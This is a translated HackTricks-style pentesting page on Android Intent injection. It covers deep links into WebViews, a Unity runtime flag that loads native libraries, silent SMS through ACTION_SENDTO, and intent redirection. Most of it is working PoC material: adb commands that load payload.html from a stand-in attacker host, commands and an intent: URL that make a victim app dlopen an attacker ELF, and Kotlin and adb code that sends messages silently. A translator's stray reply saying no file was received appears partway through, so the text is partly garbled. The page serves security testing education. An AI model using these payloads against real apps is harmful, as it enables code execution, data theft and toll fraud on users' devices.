# Intent Injection

{{#include ../../banners/hacktricks-training.md}}

Intent injection 滥用接受攻击者控制的 Intents 或随后被转换为 Intents 的数据的组件。两种在 Android 应用 pentests 中非常常见的模式是：

- 将精心构造的 extras 传递给 exported Activities/Services/BroadcastReceivers，这些 extras 随后被转发到有特权的 non-exported 组件。
- 触发 exported VIEW/BROWSABLE deep links，将攻击者控制的 URLs 转发到内部 WebViews 或其他敏感 sinks。

## Deep links → WebView sink (URL parameter injection)

如果一个应用暴露了如下自定义 scheme deep link：
```text
myscheme://com.example.app/web?url=<attacker_url>
```
如果接收的 Activity 将 `url` 查询参数转发到 WebView，你可以强制应用在其自己的 WebView 上下文中渲染任意远程内容。

PoC（通过 adb）：
```bash
# Implicit VIEW intent
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Or explicitly target an Activity
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Impact
- HTML/JS executes inside the app’s WebView profile.
- If JavaScript is enabled (by default or due to misordered checks), you can enumerate/use any exposed `@JavascriptInterface` objects, steal WebView cookies/local storage, and pivot.

See also:

{{#ref}}
webview-attacks.md
{{#endref}}

## Order-of-checks bug enabling JavaScript

一个反复出现的漏洞是，在最终的 URL 白名单/验证完成之前就启用 JavaScript（或其他宽松的 WebView 设置）。如果早期的 helper 接受了你的 deep link 且先配置了 WebView，那么即便后续的检查有缺陷或为时已晚，最终的加载也会在 JavaScript 已启用的情况下发生。

What to look for in decompiled code:
- Multiple helpers that parse/split/rebuild the URL differently (inconsistent normalization).
- Calls to `getSettings().setJavaScriptEnabled(true)` before the last host/path allowlist check.
- A pipeline like: parse → partial validate → configure WebView → final verify → loadUrl。


## Unity Runtime: Intent-to-CLI extras → pre-init native library injection (RCE)

基于 Unity 的 Android 应用通常使用 `com.unity3d.player.UnityPlayerActivity`（或 `UnityPlayerGameActivity`）作为入口 Activity。Unity 的 Android 模板将名为 `unity` 的特殊 Intent extra 视为传递给 Unity runtime 的命令行标志字符串。当入口 Activity 被 exported（在许多模板中为默认）时，任何本地应用——有时如果存在 `BROWSABLE`，甚至是网站——都可以提供该 extra。

一个危险且未记录的标志会在非常早的进程初始化阶段导致本地代码执行：

- Hidden flag: `-xrsdk-pre-init-library <absolute-path>`
- Effect: `dlopen(<absolute-path>, RTLD_NOW)` very early in init, loading attacker-controlled ELF inside the target app’s process with its UID and permissions.

Reverse-engineering excerpt (simplified):
```c
// lookup the arg value
initLibPath = FUN_00272540(uVar5, "xrsdk-pre-init-library");
// load arbitrary native library early
lVar2 = dlopen(initLibPath, 2); // RTLD_NOW
```
Why it works
- The Intent extra `unity` is parsed into Unity runtime flags.
- Supplying the pre-init flag points Unity at an attacker-controlled ELF path within an allowed linker namespace path (see constraints below).

Conditions for exploitation
- Unity 的入口 Activity 被 exported（通常默认如此）。
- 对于通过浏览器的一键远程：入口 Activity 还声明了 `android.intent.category.BROWSABLE`，因此可以从 `intent:` URL 传递 extras。

Local exploitation (same device)
1) 将 payload ELF 放在受害应用可读的路径。最简单的办法：在你的 attacker app 中随附一个恶意库，并确保它被解压到 `/data/app/.../lib/<abi>/` 下，通过在 attacker’s manifest 中设置：
```xml
<application android:extractNativeLibs="true" ...>
```
2) 使用 CLI pre-init 标志在 `unity` extra 中启动受害者的 Unity Activity。示例 ADB PoC:
```bash
adb shell am start \
-n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
-e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER_PKG==/lib/arm64/libpayload.so"
```
3) Unity 调用 `dlopen("/data/.../libpayload.so", RTLD_NOW)`；你的 payload 在受害进程中运行，继承了该应用的所有权限（摄像头/麦克风/网络/存储 等）并能访问应用内的会话/数据。

Notes
- 精确的 `/data/app/...` 路径因设备/安装而异。攻击者 app 可以在运行时通过 `getApplicationInfo().nativeLibraryDir` 获取其自身的本地库目录并将其传给触发器。
- 该文件不必以 `.so` 结尾，只要是有效的 ELF —— `dlopen()` 只看 ELF 头，而不看扩展名。

Remote one‑click via browser (conditional)
If the Unity entry activity is exported with `BROWSABLE`, a website can pass extras via an `intent:` URL:
```text
intent:#Intent;package=com.example.unitygame;scheme=whatever;\
S.unity=-xrsdk-pre-init-library%20/data/local/tmp/malicious.so;end;
```
然而，在现代 Android 上，动态链接器命名空间和 SELinux 会阻止从许多公共路径（例如 `/sdcard/Download`）加载。你会看到类似如下错误：
```
library "/sdcard/Download/libtest.so" ("/storage/emulated/0/Download/libtest.so") needed
or dlopened by "/data/app/.../lib/arm64/libunity.so" is not accessible for the
namespace: [name="clns-...", ... permitted_paths="/data:/mnt/expand:/data/data/com.example.unitygame"]
```
绕过策略：针对那些在其私有存储（例如 HTTP caches）下缓存攻击者可控字节的应用。因为允许的路径包含 `/data` 和应用的私有目录，所以将 `-xrsdk-pre-init-library` 指向应用 cache 内的一个绝对路径可以满足 linker constraints 并导致代码执行。这与此前在其它 Android 应用中遇到的 cache-to-ELF RCE 模式相呼应。


## Confused‑Deputy: Silent SMS/MMS via ACTION_SENDTO (Wear OS Google Messages)

一些默认的消息应用会错误地自动执行隐式消息 intents，将它们变成一种 confused‑deputy 原语：任何无特权的应用都可以触发 `Intent.ACTION_SENDTO`，使用 `sms:`、`smsto:`、`mms:` 或 `mmsto:` 并在没有确认 UI 且无需 `SEND_SMS` 权限的情况下立即发送。

Key points
- Trigger: implicit `ACTION_SENDTO` + messaging URI scheme.
- Data: set recipient in the URI, message text in the `"sms_body"` extra.
- Permissions: none (no `SEND_SMS`), relies on the default SMS/MMS handler.
- Observed: Google Messages for Wear OS (patched May 2025). Other handlers should be assessed similarly.

Minimal payload (Kotlin)
```kotlin
val intent = Intent(Intent.ACTION_SENDTO).apply {
data = Uri.parse("smsto:+11234567890") // or sms:, mms:, mmsto:
putExtra("sms_body", "Hi from PoC")
// From a non-Activity context add NEW_TASK
addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
}
startActivity(intent)
```
ADB PoC (无需特殊权限)
```bash
# SMS/SMS-to
adb shell am start -a android.intent.action.SENDTO -d "smsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "sms:+11234567890"   --es sms_body "hello"

# MMS/MMS-to (handler-dependent behaviour)
adb shell am start -a android.intent.action.SENDTO -d "mmsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "mms:+11234567890"   --es sms_body "hello"
```
攻击面扩展 (Wear OS)
- 任何能够启动 activities 的组件都可以触发相同的 payload：Activities、foreground Services（带有 `FLAG_ACTIVITY_NEW_TASK`）、Tiles、Complications。
- 如果默认处理程序会自动发送，滥用可能实现单击发送（one‑tap）或在后台完全静默发送，取决于 OEM 的策略。

Pentest checklist
- 对目标解析 `ACTION_SENDTO` 以识别默认处理程序；验证它是显示撰写界面（compose UI）还是静默发送。
- 测试所有四种 scheme（`sms:`, `smsto:`, `mms:`, `mmsto:`）以及 extras（`sms_body`，可选的 `subject` 用于 MMS），以检查行为差异。
- 在真实设备上测试时，考虑付费目标/高收费号码（charged destinations/premium‑rate numbers）。

## Other classic Intent injection primitives

- startActivity/sendBroadcast 使用攻击者提供的 `Intent` extras，这些 extras 随后被重新解析（`Intent.parseUri(...)`）并执行。
- 导出（exported）的代理组件将 Intents 转发到未导出（non-exported）的敏感组件而不进行权限检查。

---

## Automating exported-component testing (Smali-driven ADB generation)

当 exported 组件期望特定的 extras 时，盲猜 payload 结构会浪费时间并造成漏报（false negatives）。你可以直接从 Smali 自动发现键/类型，并生成可直接运行的 adb 命令。

Tool: APK Components Inspector
- Repo: https://github.com/thecybersandeep/apk-components-inspector
- 方法：反编译并扫描 Smali，查找类似 `getStringExtra("key")`, `getIntExtra("id", ...)`, `getParcelableExtra("redirect_intent")`, `getSerializableExtra(...)`, `getBooleanExtra(...)`, `getAction()`, `getData()` 的调用，以推断每个组件消费了哪些 extras 和字段。
- 输出：对于每个 exported Activity/Service/Receiver/Provider，该工具会打印简短说明以及带有正确类型标志的精确 `adb shell am ...`/`cmd content ...` 命令。

安装
```bash
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv && source venv/bin/activate
pip install androguard==3.3.5 rich
```
用法
```bash
python apk-components-inspector.py target.apk
```
我没有收到要翻译的文件内容。请粘贴 src/mobile-pentesting/android-app-pentesting/intent-injection.md 的内容，我会按要求翻译。
```bash
adb shell am start -n com.target/.ExportedActivity --es url https://example.tld
adb shell am startservice -n com.target/.ExportedService --ei user_id 1337 --ez force true
adb shell am broadcast -n com.target/.ExportedReceiver -a com.target.ACTION --es redirect_intent "intent:#Intent;component=com.target/.Internal;end"
adb shell cmd content query --uri content://com.target.provider/items
```
ADB am extras 速查表（类型感知标志）
- 字符串： `--es key value` | 字符串数组： `--esa key v1,v2`
- 整数： `--ei key 123` | 整数数组： `--eia key 1,2,3`
- 布尔： `--ez key true|false`
- Longs： `--el key 1234567890`
- 浮点： `--ef key 1.23`
- URI（extra）： `--eu key content://...` | Data URI（Intent data）： `-d content://...`
- 组件 extra： `--ecn key com.pkg/.Cls`
- 空字符串 extra： `--esn key`
- 常用标志： `-a <ACTION>` `-c <CATEGORY>` `-t <MIME>` `-f <FLAGS>` `--activity-clear-task --activity-new-task`

Providers 的实用技巧
- 使用 `adb shell cmd content query|insert|update|delete ...` 在无需 agent 的情况下访问 ContentProviders。
- 对于 SQLi 探测，当底层 provider 使用 SQLite 时，变换 `--projection` 和 `--where`（即 selection）。

全流程自动化（交互式执行器）
```bash
# generate and capture commands then execute them one by one interactively
python apk-components-inspector.py app.apk | tee adbcommands.txt
python run_adb_commands.py
```
<details>
<summary>用于解析并执行 adb 命令的辅助脚本</summary>
```python
import subprocess

def parse_adb_commands(file_path):
with open(file_path, 'r') as file:
lines = file.readlines()
commands = []
current = []
for line in lines:
s = line.strip()
if s.startswith("adb "):
current = [s]
elif s.startswith("#") or not s:
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
current = []
elif current:
current.append(s)
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
return commands

for i, cmd in enumerate(parse_adb_commands('adbcommands.txt'), 1):
print(f"\nCommand {i}: {cmd}")
input("Press Enter to execute this command...")
try:
r = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
print("Output:\n", r.stdout)
if r.stderr:
print("Errors:\n", r.stderr)
except subprocess.CalledProcessError as e:
print(f"Command failed with error:\n{e.stderr}")
```
</details>

Run on-device: the inspector is Python-based and works in Termux or rooted phones where `apktool`/`androguard` are available.

---

## Intent Redirection (CWE-926) – 发现与利用

Pattern
- An exported entry point (Activity/Service/Receiver) reads an incoming Intent and forwards it internally or externally without validating source/data, e.g.:
- `startActivity(getIntent())`
- `startActivity(intent)` where `intent` came from an extra like `redirect_intent`/`next_intent`/`pending_intent` or `Intent.parseUri(...)`.
- Trusting `action`/`data`/`component` fields without checks; not verifying caller identity.

What to search in Smali/Java
- Uses of `getParcelableExtra("redirect_intent")`, `getParcelable("intent")`, `getIntent().getParcelableExtra(...)`.
- Direct `startActivity(...)`, `startService(...)`, `sendBroadcast(...)` on attacker-influenced Intents.
- Lack of `getCallingPackage()`/`getCallingActivity()` checks or custom permission gates.

ADB PoC templates
- Proxy Activity forwarding an extra Intent to a privileged internal Activity:
```bash
adb shell am start -n com.target/.ProxyActivity \
--es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'
```
- 导出的 Service 会接受并处理一个 `redirect_intent` parcelable：
```bash
adb shell am startservice -n com.target/.ExportedService \
--es redirect_intent 'intent:#Intent;component=com.target/.PrivService;action=com.target.DO;end'
```
- 已导出的接收器在未经验证的情况下转发：
```bash
adb shell am broadcast -n com.target/.RelayReceiver -a com.target.RELAY \
--es forwarded 'intent:#Intent;component=com.target/.HiddenActivity;S.extra=1;end'
```
有助于 singleTask 风格行为的 Flags
```bash
# Ensure a fresh task when testing Activities that check task/intent flags
adb shell am start -n com.target/.ExportedActivity --activity-clear-task --activity-new-task
```
真实世界示例（影响视情况而异）：
- CVE-2024-26131 (Element Android)：导出流导致 WebView 操作、PIN 绕过、登录劫持。
- CVE-2023-44121 (LG ThinQ Service)：导出的 receiver action `com.lge.lms.things.notification.ACTION` → 系统级影响。
- CVE-2023-30728 (Samsung PackageInstallerCHN < 13.1.03.00)：重定向 → 任意文件访问（需要用户交互）。
- CVE-2022-36837 (Samsung Email < 6.1.70.20)：隐式 Intents leak 内容。
- CVE-2021-4438 (React Native SMS User Consent)。
- CVE-2020-14116 (Xiaomi Mi Browser)。

---

## 参考资料

- [Android – Access to app-protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Automating Android App Component Testing with New APK Inspector (blog)](https://www.mobile-hacker.com/2025/09/18/automating-android-app-component-testing-with-new-apk-inspector/)
- [APK Components Inspector – GitHub](https://github.com/thecybersandeep/apk-components-inspector)
- [Google guidance on intent redirection](https://support.google.com/faqs/answer/9267555?hl=en)
- [OVAA vulnerable app](https://github.com/oversecured/ovaa)
- [Exported Service PoC APK](https://github.com/nhattm3006/android-poc/blob/main/Exported%20Service/poc.apk)
- [Ostorlab – 100M installs image app deep dive (component summary example)](https://medium.com/@ostorlab/this-article-is-a-technical-deep-dive-showing-how-a-100m-installation-image-application-can-6343ce8ea076)
- [CVE-2024-26131 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-26131)
- [CVE-2023-44121 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-44121)
- [CVE-2023-30728 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-30728)
- [CVE-2022-36837 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2022-36837)
- [CVE-2021-4438 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4438)
- [CVE-2020-14116 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-14116)
- [CVE-2025-59489 – Arbitrary Code Execution in Unity Runtime (blog)](https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/)
- [Unity docs – Android custom activity command-line](https://docs.unity3d.com/6000.0/Documentation/Manual/android-custom-activity-command-line.html)
- [Unity Security Sept-2025-01 advisory](https://unity.com/security/sept-2025-01)
- [HEXACON talk – Messenger one-click cache-based RCE pattern (slides)](https://www.hexacon.fr/slides/Calvanno-Defense_through_Offense_Building_a_1-click_Exploit_Targeting_Messenger_for_Android.pdf)
- [CVE-2025-12080 — Intent Abuse in Google Messages for Wear OS](https://towerofhanoi.it/writeups/cve-2025-12080/)
- [PoC repo – io-no/CVE-2025-12080](https://github.com/io-no/CVE-Reports/tree/main/CVE-2025-12080)
- [Android docs – Intents and Intent Filters](https://developer.android.com/guide/components/intents-filters)


{{#include ../../banners/hacktricks-training.md}}
